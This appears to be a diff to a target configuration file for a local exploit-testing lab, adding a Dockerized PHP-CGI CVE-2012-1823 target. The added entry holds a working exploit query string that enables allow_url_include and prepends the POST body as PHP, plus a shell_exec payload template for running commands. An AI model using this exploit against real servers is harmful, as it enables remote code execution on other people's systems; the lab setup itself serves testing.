@@ -47,5 +47,21 @@
     "in_band": true,
     "type": "docker",
     "boot_wait_seconds": 20
+  },
+  {
+    "id": "phpcgi-2012-1823",
+    "name": "PHP-CGI CVE-2012-1823 Argument Injection",
+    "compose_path": "php/CVE-2012-1823",
+    "port": 8080,
+    "url": "http://127.0.0.1:8080/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+    "method": "POST",
+    "parameter_name": null,
+    "injection_point": "POST_BODY",
+    "vulnerability_type": "COMMAND_INJECTION",
+    "target_description": "Framework: PHP 5.4.1 running via PHP-CGI. Known vulnerability: CVE-2012-1823 query-string argument injection. When the query string contains no unencoded '=', PHP-CGI interprets it as command-line arguments. The exploit uses the query string '?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input' to enable url_include and prepend the POST body as PHP code. The target URL already includes this query string. The exploit payload is the POST body, which should be valid PHP that runs a shell command. Use {CMD} as the shell command placeholder inside the PHP. Example payload: <?php echo shell_exec(\"{CMD}\"); ?>",
+    "language": "php",
+    "in_band": true,
+    "type": "docker",
+    "boot_wait_seconds": 5
   }
 ]
